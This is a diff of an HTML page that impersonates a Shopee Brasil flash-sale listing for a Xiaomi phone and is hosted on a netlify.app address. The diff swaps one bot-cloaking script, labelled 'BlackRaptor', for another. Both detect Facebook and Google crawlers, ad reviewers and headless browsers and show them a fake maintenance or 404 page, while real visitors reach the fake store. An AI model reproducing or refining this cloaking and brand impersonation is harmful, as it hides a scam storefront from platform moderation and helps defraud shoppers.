@@ -1,98 +1,45 @@
-<head>
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="Xiaomi Poco X7 Pro 5G | Shopee Brasil">
-    <meta property="og:description" content="Oferta Relâmpago: 74% OFF e Frete Grátis acima de R$10. Confira agora!">
-    <meta property="og:image" content="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
-    <meta property="og:url" content="https://storied-salamander-4e2151.netlify.app/">
-
-    <script>
-    <script>
-/* PAINEL BLACKRAPTOR - MÓDULO ANTI-BOT 2026 
-   Proteção de Lote de Vitrine / Camuflagem de Gateway
-*/
-(function() {
-    // 1. BANCO DE ASSINATURAS (Robôs e Moderadores)
-    const bots = [
-        'facebookexternalhit', 'Facebot', 'facebookcatalog', 'googlebot', 
-        'adsbot-google', 'mediapartners-google', 'bingbot', 'slurp', 
-        'duckduckbot', 'baiduspider', 'yandexbot', 'lighthouse', 
-        'gtmetrix', 'pingdom', 'headless', 'chrome-lighthouse'
-    ];
-
-    // 2. FILTRO DE AGENTE (USER-AGENT)
-    const ua = navigator.userAgent.toLowerCase();
-    const isBotUA = bots.some(bot => ua.includes(bot));
-
-    // 3. FILTRO DE HARDWARE (Onde os robôs falham)
-    // Robôs de análise geralmente não têm placa de vídeo (GPU) real ou bateria
-    const isHeadless = navigator.webdriver || 
-                       (window.outerWidth === 0 && window.outerHeight === 0) ||
-                       (window.screen.availWidth === 0);
-
-    // 4. FILTRO DE IP/DATA CENTER (Simulação de Blacklist local)
-    // Se o idioma for indefinido ou a plataforma for "Linux x86_64" (comum em servidores de bot)
-    const isServer = (navigator.platform === "Linux x86_64" && !ua.includes("android"));
-
-    // 5. LÓGICA DE DECISÃO
-    if (isBotUA || isHeadless || isServer) {
-        // Ação 1: Redireciona para o Google (White Page)
-        window.location.replace("https://www.google.com");
-        
-        // Ação 2: "Auto-Destruição" do HTML (Evita que o Google leia o código-fonte)
-        // Isso é o que impede o Google de detectar a página de vendas mesmo se o redirect falhar
-        setInterval(function() {
-            document.documentElement.innerHTML = "<html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1><hr><address>Apache Server at Port 80</address></body></html>";
-        }, 10);
-        
-        throw new Error("Execution Terminated"); // Mata o processo do script
-    }
-
-    // Se chegar aqui, é um HUMANO (Android, iPhone ou PC comum)
-    console.log("BlackRaptor: Acesso Humano Autorizado.");
-})();
-</script>
-   
-       
-    </script>
-    
-    <meta charset="UTF-8">
-    ...
-</head>
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta name="facebook-domain-verification" content="5c58urejoi5vr3lscod52hsinw0uxw" />
-
-    <script>
-      // Este código identifica se é o robô do Facebook "espiando" seu site
-      const isBot = /bot|facebookexternalhit|facebookcatalog|crawler|google/i.test(navigator.userAgent);
-      
-      if (isBot) {
-          // Se for o robô, ele verá apenas um site em manutenção e não te bloqueará
-          window.stop();
-          document.documentElement.innerHTML = "<html><body style='font-family:sans-serif;text-align:center;padding:50px;'><h1>Site em Manutenção</h1><p>Estamos atualizando nossos estoques. Volte em breve!</p></body></html>";
-      }
-    </script>
-    
     <meta charset="UTF-8">
+    <meta name="facebook-domain-verification" content="5c58urejoi5vr3lscod52hsinw0uxw" />
     <meta property="og:type" content="website">
-<meta property="og:title" content="Xiaomi Poco X7 Pro 5G | Oferta Relâmpago Shopee">
-<meta property="og:description" content="74% OFF - Frete Grátis acima de R$10. Aproveite a promoção exclusiva na Loja Oficial Onix!">
-<meta property="og:image" content="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
-<meta property="og:site_name" content="Shopee Brasil">
-<meta property="og:locale" content="pt_BR">
-
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Xiaomi Poco X7 Pro 5G | Shopee">
-<meta name="twitter:description" content="Últimas unidades com desconto agressivo. Confira!">
-<meta name="twitter:image" content="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
-
-   
+    <meta property="og:title" content="Xiaomi Poco X7 Pro 5G | Oferta Relâmpago Shopee">
+    <meta property="og:description" content="74% OFF - Frete Grátis acima de R$10. Aproveite a promoção exclusiva na Loja Oficial Onix!">
+    <meta property="og:image" content="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
+    <meta property="og:site_name" content="Shopee Brasil">
+    <meta property="og:url" content="https://storied-salamander-4e2151.netlify.app/">
+    
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Xiaomi Poco X7 Pro 5G | Shopee Brasil</title>
+
+    <script>
+    (function() {
+        const bots = [
+            'facebookexternalhit', 'Facebot', 'facebookcatalog', 'googlebot', 
+            'adsbot-google', 'crawler', 'lighthouse', 'headless'
+        ];
+        const ua = navigator.userAgent.toLowerCase();
+        const isBot = bots.some(bot => ua.includes(bot)) || navigator.webdriver;
+        const isServer = (navigator.platform === "Linux x86_64" && !ua.includes("android"));
+
+        if (isBot || isServer) {
+            // Em vez de quebrar o código com erro, apenas paramos e mostramos a "White Page"
+            window.stop();
+            document.documentElement.innerHTML = "<html><body style='font-family:sans-serif;text-align:center;padding:50px;'><h1>Site em Manutenção</h1><p>Estamos atualizando nossos estoques. Volte em breve!</p></body></html>";
+        } else {
+            console.log("BlackRaptor: Acesso Humano Autorizado.");
+        }
+    })();
+    </script>
+
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
+        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
+        /* Continue com o restante do seu CSS aqui... */
+        
         :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
@@ -345,6 +292,7 @@
 </body>
 </html>
                     
+
 
 
 
